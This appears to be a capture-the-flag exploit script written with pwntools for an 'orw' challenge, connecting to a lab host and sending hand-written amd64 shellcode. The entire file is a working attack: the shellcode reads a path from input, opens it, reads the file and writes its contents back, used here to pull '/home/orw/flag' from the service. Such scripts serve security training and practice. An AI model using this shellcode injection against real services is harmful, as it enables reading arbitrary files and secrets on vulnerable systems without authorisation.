#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

host = "10.211.55.6"
port = 8888

context.arch = "amd64"    
r = remote(host,port)

r.recvuntil(":")

# read(0,buf(rsp),0x40) -> read flag string
# fd = open(buf,0)
# size = read(fd,rsp,0x40)
# write(1,rsp,size)
sc = asm("""
readstr:
    xor rax,rax
    xor rdi,rdi
    mov rsi,rsp
    mov rdx,0x40
    syscall
open:
    mov rdi,rsp
    xor rsi,rsi
    mov rax,2
    syscall
readflag:
    mov rdi,rax
    mov rsi,rsp
    mov rdx,0x40
    xor rax,rax
    syscall
write :
    mov rdx,rax
    mov rdi,1
    mov rsi,rsp
    mov rax,1
    syscall
exit:
    mov rax,60
    syscall

""")
r.sendline(sc)
r.sendline("/home/orw/flag\x00")
r.interactive()
